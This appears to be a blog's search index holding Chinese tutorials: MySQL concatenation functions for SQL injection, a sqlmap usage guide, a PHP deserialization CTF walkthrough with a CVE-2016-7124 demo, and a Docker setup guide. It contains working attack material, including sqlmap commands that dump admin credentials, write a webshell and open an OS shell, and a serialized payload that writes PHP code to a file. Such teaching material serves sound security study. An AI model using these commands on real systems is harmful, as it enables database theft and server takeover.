<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[SQL注入中常用的三个字符串连接函数]]></title>
    <url>%2Fconcat-in-sql-injection%2F</url>
    <content type="text"><![CDATA[函数介绍 两条常用的语句 参考 在SQL注入过程中，通常需要将select后的数据进行回显。如果有多个数据需要输出时，需要使用到字符串连接函数。在MySQL中，可以使用concat()、group_concat()、concat_ws()三个函数进行字符串连接。 一. 函数介绍1. concat(str1,str2,...)——没有分隔符地连接字符串不使用字符串连接函数时SELECT id,name FROM info LIMIT 1;的返回结果为+—-+——–+| id | name |+—-+——–+| 1 | BioCyc |+—-+——–+ 使用字符串连接函数时SELECT CONCAT(id, &#39;，&#39;, name) AS con FROM info LIMIT 1;返回结果为 +———-+| con |+———-+| 1,BioCyc |+———-+ SELECT CONCAT(&#39;My&#39;, NULL, &#39;QL&#39;);返回结果为+————————–+| CONCAT(‘My’, NULL, ‘QL’) |+————————–+| NULL |+————————–+ 2. concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串CONCAT_WS()代表CONCAT With Separator，是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是其它参数。如果分隔符为NULL，则结果为NULL。函数会忽略任何分隔符参数后的NULL值。但是CONCAT_WS()不会忽略任何空字符串 (然而会忽略所有的NULL）。 SELECT CONCAT_WS(&#39;_&#39; , id , name) AS con_ws FROM info LIMIT 1;返回结果为+———-+| con_ws |+———-+| 1_BioCyc |+———-+ SELECT CONCAT_WS(&#39;,&#39; , &#39;First name&#39; , NULL , &#39;Last Name&#39;);返回结果为+———————————————-+| CONCAT_WS(‘,’,’First name’,NULL,’Last Name’) |+———————————————-+| First name,Last Name |+———————————————-+ 3. group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据使用表info作为示例，语句SELECT locus,id,journal FROM info WHERE locus IN(&#39;AB086827&#39;,&#39;AF040764&#39;);的返回结果为 +———-+—-+————————–+ | locus | id | journal | +———-+—-+————————–+ | AB086827 | 1 | Unpublished | | AB086827 | 2 | Submitted (20-JUN-2002) | | AF040764 | 23 | Unpublished | | AF040764 | 24 | Submitted (31-DEC-1997) | +———-+—-+————————–+ 使用语法及特点：GROUP_CONCAT([DISTINCT] expr [,expr ...] [ORDER BY {unsigned_integer | col_name | formula} [ASC | DESC] [,col ...]] [SEPARATOR str_val])在 MySQL 中，你可以得到表达式结合体的连结值。 通过使用 DISTINCT 可以排除重复值。如果希望对结果中的值进行排序，可以使用 ORDER BY 子句。SEPARATOR 是一个字符串值，它被用于插入到结果值中。缺省为一个逗号(“,”)，可以通过指定 SEPARATOR “” 完全地移除这个分隔符。 可以通过变量 group_concat_max_len 设置一个最大的长度。在运行时执行的句法如下： SET [SESSION | GLOBAL] group_concat_max_len = unsigned_integer;如果最大长度被设置，结果值被剪切到这个最大长度。如果分组的字符过长，可以对系统参数进行设置：SET @@global.group_concat_max_len=40000; 使用示例：语句SELECT locus,GROUP_CONCAT(id) FROM info WHERE locus IN(&#39;AB086827&#39;,&#39;AF040764&#39;) GROUP BY locus;的返回结果为 +———-+——————+ | locus | GROUP_CONCAT(id) | +———-+——————+ | AB086827 | 1,2 | | AF040764 | 23,24 | +———-+——————+ 语句SELECT locus,GROUP_CONCAT(distinct id ORDER BY id DESC SEPARATOR &#39;_&#39;) FROM info WHERE locus IN(&#39;AB086827&#39;,&#39;AF040764&#39;) GROUP BY locus;的返回结果为 +———-+———————————————————-+ | locus | GROUP_CONCAT(distinct id ORDER BY id DESC SEPARATOR ‘_’) | +———-+———————————————————-+ | AB086827 | 2_1 | | AF040764 | 24_23 | +———-+———————————————————-+ 语句SELECT locus,GROUP_CONCAT(concat_ws(&#39;, &#39;,id,journal) ORDER BY id DESC SEPARATOR &#39;. &#39;) FROM info WHERE locus IN(&#39;AB086827&#39;,&#39;AF040764&#39;) GROUP BY locus;的返回结果为 +———-+————————————————————————–+ | locus | GROUP_CONCAT(concat_ws(‘, ‘,id,journal) ORDER BY id DESC SEPARATOR ‘. ‘) | +———-+————————————————————————–+ | AB086827 | 2, Submitted (20-JUN-2002). 1, Unpublished | | AF040764 | 24, Submitted (31-DEC-1997) . 23, Unpublished | +———-+————————————————————————–+ 二. 几条常用的语句列出所有的数据库 select group_concat(schema_name) from information_schema.schemata 列出某个库当中所有的表 select group_concat(table_name) from information_schema.tables where table_schema=&#39;库名&#39; 列出某个表中的所有列 select group_concat(column_name) from information_schema.columns where table_schema=&#39;库名&#39; and table_name=&#39;表名&#39; 列出某个列中的所有数据 select group_concat(列名) from 库名.表名 三. 参考[1] Sql注入中连接字符串常用函数]]></content>
      <categories>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQLmap入门]]></title>
    <url>%2Fsqlmap-guidebook%2F</url>
    <content type="text"><![CDATA[什么是SQLmap SQLmap的参数设定 几个例子 SQLmap参数详解 一. 什么是SQLmapsqlmap是一个开源的渗透测试工具，可以自动检测和利用SQL注入漏洞并接管数据库服务器。 sqlmap支持五种不同的注入模式： 基于布尔的盲注，即可以根据返回页面判断条件真假的注入。 基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。 联合查询注入，可以使用union的情况下的注入。 堆查询注入，可以同时执行多条语句的执行时的注入。 sqlmap支持以下数据库 MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase,SAP MaxDB 二. SQLmap的参数设置1. output verbosity -v通过这个参数来设置输出文本的可见度。共有7个可见度等级，默认等级为1，在这个等级下，information,warning,error,critical messages and python tracebacks会被显示出来。 0:只显示python错误以及严重的信息。1:同时显示基本信息和警告信息。（默认）2:同时显示debug信息。3:同时显示注入的payload。4:同时显示HTTP请求。5:同时显示HTTP响应头。6:同时显示HTTP响应页面 2. target2.1 直接连接数据库 -d使用sqlmap连接一个数据库，需要下面2种格式的连接字符串。 DBMS://USER:PASSWORD@DBMS_IP:DBMS_PORT/DATABASE_NAME (MySQL, Oracle, Microsoft SQL Server, PostgreSQL, etc.) DBMS://DATABASE_FILEPATH (SQLite, Microsoft Access, Firebird, etc.) 示例 1python sqlmap.py -d &quot;mysql://admin:admin@192.168.21.17:3306/testdb&quot; -f --banner --dbs --users 2.2 指定目标URL -u --url使用sqlmap测试目标URL，需要下面格式的URL 1http(s)://targeturl[:port]/[...] 示例 1python sqlmap.py -u http://www.target.com/vuln.php?id=1&quot; -f --banner --dbs --usersb 2.3 从站点地图文件中获取目标 -x为便于搜索引擎收录，许多网站专门为搜索引擎生成了xml格式的站点地图。Sqlmap可以直接解析xml格式的站点地图，从中提取攻击目标，对一个网站全方位无死角地进行注入检测。 示例 1python sqlmap.py -x http://www.target.com/sitemap.xml 2.4 从文本文件中获取目标 -m将多个目标URL写在一个文本文件中，sqlmap会按顺序扫描每个URL。 示例 将待测URL写在url.txt中，格式如下 123www.target1.com/vuln1.php?q=foobarwww.target2.com/vuln2.asp?id=1www.target3.com/vuln3/id/1* 运行sqlmap 1python sqlmap.py -m url.txt 2.5 从文本文件中加载HTTP请求 -r从文本文件中加载原始HTTP请求，这种方式可以让你跳过输入一些参数，如设置cookie，post数据等。可以使用BurpSuite抓包并保存HTTP请求文件 HTTP请求文件格式 12345POST /vuln.php HTTP/1.1Host: www.target.comUser-Agent: Mozilla/4.0id=1 sqlmap支持HTTPS，可以在命令后加上--force-ssl强制使用SSL连接到443/tcp端口。也可以在Host头后加上:443来使用HTTPS。 3. request3.1 HTTP 请求方式 --methodsqlmap会自动检测正确的HTTP请求方式。然而，在一些情况下，需要使用不会自动识别的特殊HTTP请求方式，例如PUT，这时就需要指定请求方式。 For example: 1--method=PUT 3.2 HTTP POST数据 --data默认情况下，sqlmap使用GET，但你可以通过提供POST数据将请求方式改为POST。这些数据会被当做SQL注入测试的参数。 For example: 1$ python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;id=1&quot; -f --banner --dbs --users 3.3 指定参数分割符 --param-del有些情况下，默认参数分割符(如GET和POST中的&amp;)需要被指定为新的分割符来保证sqlmap可以正常差分并处理每个参数。 For example: 12$ python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;query=foobar;id=\1&quot; --param-del=&quot;;&quot; -f --banner --dbs --users 3.4 HTTP COOKIE –cookie–cookie-del–load-cookies–drop-set-cookie 使用这些参数的两种情况： 测试页面需要基于cookie的登录认证，并且你有这些数据 想要测试cookie注入(当--level设置为2或更高时，sqlmap会检测cookie注入) 两种情况均需要使用sqlmap发送cookie，可以使用下方步骤发送cookie 登录网页 从浏览器中获取cookie 将第二步获得cookie作为--cookie的值 注意，HTTP cookie中的值通常由;来分割，而不是&amp;。sqlmap可以从GET和POST参数中，分辨出cookie并将其作为独立参数。为了防止分割符不是;可以通过–-cookie-del来设置分割符。 在后续的连接中，若HTTP响应头仍有Set-Cookie，sqlmap会自动使用之前设置的cookie，并测试这些值。可以通过--drop-set-cookie参数使sqlmap忽略Set-Cookie。 反之，如果你提供了一个HTTP Cookie头，并且使用了--cookie，而且目标URL每次都发送HTTP Set-Cookie，这时，sqlmap会询问你要为HTTP请求使用哪组cookie。 可以使用--load-cookies载入文件中包含的Netscape/wget格式的cookie。 三. 几个例子1. 检测注入1.1 基本格式1sqlmap -u &quot;http://www.target.com/index.php?id=1&quot; 默认使用level1检测全部数据库类型 1sqlmap -u &quot;http://www.target.com/index.php?id=1&quot; –dbms mysql –level 3 指定数据库类型为mysql，级别为3（共5级，级别越高，检测越全面） 1.2 cookie注入1sqlmap -u &quot;http://www.target.com/index.php&quot; –cookie &quot;id=11&quot; –level 2 当程序有防get注入的时候，可以使用cookie注入（只有level达到2才会检测cookie） 1.3 从post数据包中注入可以使用burpsuite或者temperdata等工具来抓取post包 sqlmap -r “c:\request.txt” -p “username” –dbms mysql 指定username参数 2. 数据库操作2.1 获取数据库基本信息查询有哪些数据库 1sqlmap -u “http://www.target.com/index.php?id=1” –dbms mysql –level 3 –dbs 查询test数据库中有哪些表 1sqlmap -u “http://www.target.com/index.php?id=1” –dbms mysql –level 3 -D test –tables 查询test数据库中admin表有哪些字段 1sqlmap -u “http://www.target.com/index.php?id=1” –dbms mysql –level 3 -D test -T admin –columns dump出字段username与password中的数据 1sqlmap -u “http://www.target.com/index.php?id=1” –dbms mysql –level 3 -D test -T admin -C “username,password” –dump 2.2 搜索字段1sqlmap -r “c:\request.txt” –dbms mysql -D dedecms –search -C admin,password 在dedecms数据库中搜索字段admin或者password。 2.3 文件读写首先找需要网站的物理路径，其次需要有可写或可读权限。 –file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径） –file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell） –file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径 #示例： sqlmap -r “c:\request.txt” -p id –dbms mysql –file-dest “c:\dvwa\inc\include\1.php” –file-write “f:\webshell\1112.php” 使用shell命令： sqlmap -r “c:\request.txt” -p id –dms mysql –os-shell 接下来指定网站可写目录： “c:\php\dvwa” #注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个xp_dirtree()函数 四. SQLmap参数详解123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169–is-dba 当前用户权限（是否为root权限）–dbs 所有数据库–current-db 网站当前数据库–users 所有数据库用户–current-user 当前数据库用户–random-agent 构造随机user-agent–passwords 数据库密码–proxy http://local:8080 –threads 10 (可以自定义线程加速) 代理–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）#Options–version 显示程序的版本号并退出-h, –help 显示此帮助消息并退出-v VERBOSE 详细级别：0-6（默认为1）#保存进度继续跑：sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” 保存进度sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” –resume 恢复已保存进度#Target-d DIRECT 直接连接到数据库。-u URL, –url=URL 目标URL。-l LIST 从Burp或WebScarab代理的日志中解析目标。-r REQUESTFILE 从一个文件中载入HTTP请求。-g GOOGLEDORK 处理Google dork的结果作为目标URL。-c CONFIGFILE 从INI配置文件中加载选项。#Request#这些选项可以用来指定如何连接到目标URL。–data=DATA 通过POST发送的数据字符串–cookie=COOKIE HTTP Cookie头–cookie-urlencode URL 编码生成的cookie注入–drop-set-cookie 忽略响应的Set – Cookie头信息–user-agent=AGENT 指定 HTTP User – Agent头–random-agent 使用随机选定的HTTP User – Agent头–referer=REFERER 指定 HTTP Referer头–headers=HEADERS 换行分开，加入其他的HTTP头–auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)–auth-cred=ACRED HTTP身份验证凭据（用户名:密码）–auth-cert=ACERT HTTP认证证书（key_file，cert_file）–proxy=PROXY 使用HTTP代理连接到目标URL–proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）–ignore-proxy 忽略系统默认的HTTP代理–delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒–timeout=TIMEOUT 等待连接超时的时间（默认为30秒）–retries=RETRIES 连接超时后重新连接的时间（默认3）–scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式–safe-url=SAFURL 在测试过程中经常访问的url地址–safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL#Enumeration#这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的SQL语句。-b, –banner 检索数据库管理系统的标识–current-user 检索数据库管理系统当前用户–current-db 检索数据库管理系统当前数据库–is-dba 检测DBMS当前用户是否DBA–users 枚举数据库管理系统用户–passwords 枚举数据库管理系统用户密码哈希–privileges 枚举数据库管理系统用户的权限–roles 枚举数据库管理系统用户的角色–dbs 枚举数据库管理系统数据库-D DBname 要进行枚举的指定数据库名-T TBLname 要进行枚举的指定数据库表（如：-T tablename –columns）–tables 枚举的DBMS数据库中的表–columns 枚举DBMS数据库表列–dump 转储数据库管理系统的数据库中的表项–dump-all 转储所有的DBMS数据库表中的条目–search 搜索列（S），表（S）和/或数据库名称（S）-C COL 要进行枚举的数据库列-U USER 用来进行枚举的数据库用户–exclude-sysdbs 枚举表时排除系统数据库–start=LIMITSTART 第一个查询输出进入检索–stop=LIMITSTOP 最后查询的输出进入检索–first=FIRSTCHAR 第一个查询输出字的字符检索–last=LASTCHAR 最后查询的输出字字符检索–sql-query=QUERY 要执行的SQL语句–sql-shell 提示交互式SQL的shell#Optimization#这些选项可用于优化SqlMap的性能。-o 开启所有优化开关–predict-output 预测常见的查询输出–keep-alive 使用持久的HTTP（S）连接–null-connection 从没有实际的HTTP响应体中检索页面长度–threads=THREADS 最大的HTTP（S）请求并发量（默认为1）#Injection#这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。#-p TESTPARAMETER 可测试的参数（S）–dbms=DBMS 强制后端的DBMS为此值–os=OS 强制后端的DBMS操作系统为这个值–prefix=PREFIX 注入payload字符串前缀–suffix=SUFFIX 注入payload字符串后缀–tamper=TAMPER 使用给定的脚本（S）篡改注入数据#Detection这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。–level=LEVEL 执行测试的等级（1-5，默认为1）–risk=RISK 执行测试的风险（0-3，默认为1）–string=STRING 查询时有效时在页面匹配字符串–regexp=REGEXP 查询时有效时在页面匹配正则表达式–text-only 仅基于在文本内容比较网页#Techniques#这些选项可用于调整具体的SQL注入测试。–technique=TECH SQL注入技术测试（默认BEUST）–time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）–union-cols=UCOLS 定列范围用于测试UNION查询注入–union-char=UCHAR 用于暴力猜解列数的字符#File system access#这些选项可以被用来访问后端数据库管理系统的底层文件系统。–file-read=RFILE 从后端的数据库管理系统文件系统读取文件–file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件–file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径#Operating system access#这些选项可以用于访问后端数据库管理系统的底层操作系统。–os-cmd=OSCMD 执行操作系统命令–os-shell 交互式的操作系统的shell–os-pwn 获取一个OOB shell，meterpreter或VNC–os-smbrelay 一键获取一个OOB shell，meterpreter或VNC–os-bof 存储过程缓冲区溢出利用–priv-esc 数据库进程用户权限提升–msf-path=MSFPATH Metasploit Framework本地的安装路径–tmp-path=TMPPATH 远程临时文件目录的绝对路径#Windows注册表访问：#这些选项可以被用来访问后端数据库管理系统Windows注册表。–reg-read 读一个Windows注册表项值–reg-add 写一个Windows注册表项值数据–reg-del 删除Windows注册表键值–reg-key=REGKEY Windows注册表键–reg-value=REGVAL Windows注册表项值–reg-data=REGDATA Windows注册表键值数据–reg-type=REGTYPE Windows注册表项值类型#这些选项可以用来设置一些一般的工作参数。-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中-s SESSIONFILE 保存和恢复检索会话文件的所有数据–flush-session 刷新当前目标的会话文件–fresh-queries 忽略在会话文件中存储的查询结果–eta 显示每个输出的预计到达时间–update 更新SqlMap–save file保存选项到INI配置文件–batch 从不询问用户输入，使用所有默认配置。#Miscellaneous–beep 发现SQL注入时提醒–check-payload IDS对注入payloads的检测测试–cleanup SqlMap具体的UDF和表清理DBMS–forms 对目标URL的解析和测试形式–gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果–page-rank Google dork结果显示网页排名（PR）–parse-errors 从响应页面解析数据库管理系统的错误消息–replicate 复制转储的数据到一个sqlite3数据库–tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址–wizard 给初级用户的简单向导界面]]></content>
      <categories>
        <category>工具使用</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>SQLmap</tag>
        <tag>工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP反序列化原理及漏洞解析]]></title>
    <url>%2FphpUnserialize%2F</url>
    <content type="text"><![CDATA[什么是PHP序列化 PHP序列化与反序列化的过程 一个反序列化漏洞的例子 CVE-2016-7124 一. 什么是PHP序列化与反序列化1. PHP序列化PHP序列化是指把变量转化成可保存或传输的字符串的过程，PHP序列化函数有serialize、json_encode。 以下例子可以实现PHP序列化 12345678910111213&lt;?php class test &#123; public $name = 'jacky'; public $age = '18'; public $heavy = '81.5'; public $boolean = true; public $null = NULL; public $array = array(1,2,3,4,5); &#125; $jacky = new test; echo serialize($jacky);?&gt; 输出的结果为 O:4:”test”:6:{s:4:”name”;s:5:”jacky”;s:3:”age”;s:2:”18”;s:5:”heavy”;s:4:”81.5”;s:7:”boolean”;b:1;s:4:”null”;N;s:5:”array”;a:5:{i:0;i:1;i:1;i:2;i:2;i:3;i:3;i:4;i:4;i:5;}} 其中每项的标识所代表的含义 标识 含义 s 字符串(string) i 整型(integer) b 布尔(boolean) d 双精度(double) N 空(NULL) a 数组(array) 同时，序列化过程中还会对不同属性的变量进行不同方式的变化 public的属性在序列化时，直接显示属性名protected的属性在序列化时，会在属性名前增加0x00*0x00，其长度会增加3private的属性在序列化时，会在属性名前增加0x00classname0x00，其长度会增加类名长度+2 2. 反序列化PHP反序列是指将经过序列化的数据转化成原先的状态，PHP反序列化函数有unserialize、json_decode。 二. PHP序列化与反序列化的过程1. PHP魔法函数PHP中包含很多魔法函数，他们可以在某些情况下自动执行而不需要手动调用 12345678910111213141516__construct() #类的构造函数__destruct() #类的析构函数__call() #在对象中调用一个不可访问方法时调用__callStatic() #用静态方式中调用一个不可访问方法时调用__get() #获得一个类的成员变量时调用__set() #设置一个类的成员变量时调用__isset() #当对不可访问属性调用isset()或empty()时调用__unset() #当对不可访问属性调用unset()时被调用。__sleep() #执行serialize()时，先会调用这个函数__wakeup() #执行unserialize()时，先会调用这个函数__toString() #类被当成字符串时的回应方法__invoke() #调用函数的方式调用一个对象时的回应方法__set_state() #调用var_export()导出类时，此静态方法会被调用。__clone() #当对象复制完成时调用__autoload() #尝试加载未定义的类__debugInfo() #打印所需调试信息 2. 如何进行序列化在对象被序列化之前，会检查是否有__sleep()函数，如果存在，该函数会清理对象，并返回一个数组，数组中包含被序列化的对象的所有属性的名称。如果该方法不返回任何内容，则序列化后的字符串将变为N并提示Notice。__sleep()的预期用途是提交需要挂起的数据或执行类似的清理任务。如果有一个非常大的对象，不需要完全保存其所有属性，该功能将非常有用。 在反序列化之前，会检查是否具有__wakeup()魔术方法。如果存在该方法，则在反序列化时执行该方法。__wakeup()魔术方法可以重构对象可能具有的任何资源。__wakeup()预期用途是重新建立在序列化期间可能已丢失的任何数据库连接，并执行其他重新初始化任务。 123456789101112131415161718192021222324252627282930313233343536373839&lt;?php class test &#123; public $value; function __construct()&#123; echo "__construct"; echo "&lt;br /&gt;"; &#125; function __destruct()&#123; echo "__destruct"; echo "&lt;br /&gt;"; &#125; function __wakeup()&#123; echo "__wakeup"; echo "&lt;br /&gt;"; &#125; function __toString()&#123; echo "__toString"; echo "&lt;br /&gt;"; return $this-&gt;value; &#125; function setValue($parm)&#123; echo "setValue"; echo "&lt;br /&gt;"; $this-&gt;value = $parm; &#125; &#125; $test = new test; $test-&gt;setValue("Jacky"); $ser_test = serialize($test); echo $ser_test."&lt;br /&gt;"; $obj = unserialize($ser_test); echo $obj."&lt;br /&gt;";?&gt; 12345678910//output__constructsetValueO:4:&quot;test&quot;:1:&#123;s:5:&quot;value&quot;;s:5:&quot;Jacky&quot;;&#125;__wakeup__toStringJacky__destruct__destruct 3. __autoloading()函数传统的PHP只能反序列化定义过的类，意味着每个PHP文件都需要包含很多文件，在当前主流的PHP框架中，都采用了__autoloading()自动加载类来完成这项繁重的工作。在简化了工作的同时，也为序列化漏洞造成了便捷。 4. 反序列化过程中魔术方法的执行顺序__wakeup()&gt; __toString()&gt; __destruct() 三. 一个反序列化漏洞的例子题目地址：welcome to bugkuctf 右击查看源代码，可以看到如下提示 12345678910$user = $_GET["txt"]; $file = $_GET["file"]; $pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //hint.php &#125;else&#123; echo "you are not admin ! "; &#125; 首先我们尝试将$user的值改为welcome to the bugkuctf，由于使用的是file_get_contents()函数，所以需要使用PHP伪协议来传入$user的值，payload如下 下一步处理$file的值，可以看到代码中有文件包含，并提示了所包含的文件时hint.php，这里需要使用另一个PHP伪协议来传入$file的值，payload如下 将出现的字符通过base64解密，可以得到如下代码 12345678910111213&lt;?php class Flag&#123;//flag.php public $file; public function __tostring()&#123; if(isset($this-&gt;file))&#123; echo file_get_contents($this-&gt;file); echo "&lt;br&gt;"; return ("good"); &#125; &#125; &#125; ?&gt; 可以看到，在flag.php文件中有一个Flag类，此外，我们可以用同样的方法得到index.php文件中的内容 12345678910111213141516171819202122232425262728293031$txt = $_GET["txt"];$file = $_GET["file"];$password = $_GET["password"]; if(isset($txt)&amp;&amp;(file_get_contents($txt,'r')==="welcome to the bugkuctf"))&#123; echo "hello friend!&lt;br&gt;"; if(preg_match("/flag/",$file))&#123; echo "不能现在就给你flag哦"; exit(); &#125;else&#123; include($file); $password = unserialize($password); echo $password; &#125;&#125;else&#123; echo "you are not the number of bugku ! ";&#125; ?&gt; &lt;!-- $user = $_GET["txt"];$file = $_GET["file"];$pass = $_GET["password"]; if(isset($user)&amp;&amp;(file_get_contents($user,'r')==="welcome to the bugkuctf"))&#123; echo "hello admin!&lt;br&gt;"; include($file); //hint.php&#125;else&#123; echo "you are not admin ! ";&#125; 其中有一段代码时这样的 123 if(preg_match("/flag/",$file))&#123; echo "不能现在就给你flag哦"; exit(); 意思就是说如果直接引用flag.php这个文件是不会显示flag的值的。 同时，还发现了另一段代码 123include($file);$password = unserialize($password);echo $password; 这个else写到如果我的$file不包含flag.php，那么我就会把那个文件包含进来，之后将password反序列化一下。并输出password的结果。而我们根据上面的hint.php发现，在Flag类被创建时，__tostring()函数会自动执行，同时如果引用的文件存在，会输出文件中的内容。所以，构造如下payload 查看源代码，即可看到flag 四. CVE-2016-71241. 漏洞分析该漏洞存在于PHP5小于5.6.25版本或PHP7小于7.0.10版本中，该漏洞简单来说就是当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup()的执行，demo如下 123456789101112131415161718192021222324252627&lt;html&gt;&lt;head&gt;&lt;title&gt;PHP反序列化demo&lt;/title&gt;&lt;meta charset=&quot;utf-8&quot;&gt;&lt;/head&gt;&lt;body&gt;&lt;?phpclass test&#123; var $name = &quot;Jacky&quot;; function __destruct()&#123; $file = fopen(&quot;hello.php&quot;,&quot;w&quot;); fputs($file,$this-&gt;name); fclose($file); &#125; function __wakeup() &#123; foreach(get_object_vars($this) as $k =&gt; $v) &#123; $this-&gt;$k = null; &#125; echo &quot;Waking up...\n&quot;; &#125;&#125;$test = $_POST[&apos;test&apos;];$test_unser = unserialize($test);?&gt;&lt;/body&gt;&lt;/html&gt; 由于__wakeup()的执行顺序在__destruct()之前，所以__wakeup()会将对象内的所有属性设为NULL，在__destruct()执行时，没有内容会写到文件中。但使用漏洞，可以跳过__wakeup()，直接执行__destruct()，这样可以将属性内容写入文件中。 如果我们使用如下payload 1test=O:4:&quot;test&quot;:1:&#123;s:4:&quot;name&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125; 会执行__wakeup()函数，页面上会出现如下输出 使用如下payload 1test=O:4:&quot;test&quot;:2:&#123;s:4:&quot;name&quot;;s:18:&quot;&lt;?php phpinfo();?&gt;&quot;;&#125; 执行后，会将&lt;?php phpinfo();?&gt;写入hello.php文件中。]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu16.04安装python3.7和docker]]></title>
    <url>%2Fubuntu16-04-python3-7-docker%2F</url>
    <content type="text"><![CDATA[什么是docker 安装python3.7 搭建docker环境 一. 什么是dockerDocker 是一个开源的应用容器引擎，让开发者可以打包他们的应用以及依赖包到一个可移植的容器中，然后发布到任何流行的Linux机器上，也可以实现虚拟化，容器是完全使用沙箱机制，相互之间不会有任何接口。 一个完整的Docker有以下几个部分组成： DockerClient客户端 Docker Daemon守护进程 Docker Image镜像 DockerContainer容器 二. 安装python3.7本次python3.7使用源码安装 1. 安装环境123sudo apt-get install zlib1g-dev libbz2-dev libssl-dev libncurses5-dev libsqlite3-dev libreadline-dev tk-dev libgdbm-dev libdb-dev libpcap-dev xz-utils libexpat1-dev liblzma-dev libffi-dev libc6-dev 2. 源码安装2.1下载源码包从官网下载最新版本源码包并解压 2.2 建立安装目录1sudo mkdir -p /usr/local/python3.7 2.3 编译安装进入源码包目录下，使用如下命令 123./configure --prefix=/usr/local/python3.7 --enable-optimizationsmakesudo make install 如果编译过程中出现如下问题 123ModuleNotFoundError: No module named &apos;_ctypes&apos;Makefile:1130: recipe for target &apos;install&apos; failedmake: *** [install] Error 可以使用如下方法解决 12345678sudo apt-get updatesudo apt-get upgradesudo apt-get dist-upgradesudo apt-get install build-essential python-dev python-setuptools python-pip python-smbussudo apt-get install build-essential libncursesw5-dev libgdbm-dev libc6-devsudo apt-get install zlib1g-dev libsqlite3-dev tk-devsudo apt-get install libssl-dev opensslsudo apt-get install libffi-dev 3 添加软连接1234#添加python3的软链接ln -s /usr/local/python3/bin/python3.7 /usr/bin/python3.7#添加 pip3 的软链接ln -s /usr/local/python3/bin/pip3.7 /usr/bin/pip3.7 4 检测版本12python3.7 -Vpip3.7 -V 二. 搭建docker环境1.安装docker1.1 安装1sudo curl -s https://get.docker.com/ | sh 如果提示没有curl，可以按照提示安装curl不使用apt install方式安装docker是因为，如果源上的docker不是最新的，无法安装最新版本的docker。 1.2 几个遇到的问题1) 123E: Failed to fetch https://download.docker.com/linux/ubuntu/dists/xenial/pool/stable/amd64/containerd.io_1.2.5-1_amd64.deb Operation too slow. Less than 10 bytes/sec transferred the last 120 secondsE: Unable to fetch some archives, maybe run apt-get update or try with --fix-missing? 这是网络问题，挂个梯子就行了 2) 1E: Sub-process /usr/bin/dpkg returned an error code (1) 使用如下命令解决 12sudo apt-get update --fix-missingsudo apt-get autoremove &amp;&amp; sudo apt-get clean &amp;&amp; sudo apt-get install -f 2. 安装docker-compose2.1 安装使用刚刚安装的python3.7自带的pip3安装 1pip3 install docker-compose --user 2.2 添加软连接安装完成后使用如下命令查看安装位置 1pip3 show docker-compose 显示如下结果 12345678910Name: docker-composeVersion: 1.24.0Summary: Multi-container orchestration for DockerHome-page: https://www.docker.com/Author: Docker, Inc.Author-email: NoneLicense: Apache License 2.0Location: /home/cheng/.local/lib/python3.7/site-packagesRequires: docopt, dockerpty, PyYAML, jsonschema, requests, docker, texttable, websocket-client, cached-property, sixRequired-by: Location一项即是docker-compose的安装路径，使用如下命令为docker-compose创建软连接 1sudo ln -s /home/cheng/.local/bin/docker-compose /usr/bin/ 3. docker使用3.1 添加加速使用DaoCloud为docker进行加速 1curl -sSL https://get.daocloud.io/daotools/set_mirror.sh | sh -s http://f1361db2.m.daocloud.io 3.2 docker镜像操作1234docker search mysql //搜索docker pull 镜像名称 //下载docker images //查看本地已下载镜像docker rmi 镜像id //删除镜像 3.3 docker容器操作123456789101112docker run -d -p --name 容器名或镜像ID）-d 后台运行-p 随机分配端口-p 端口1（宿主机）:端口2（容器中）//端口转发docker ps //查看当前处于运行状态的容器docker start 容器ID或容器名 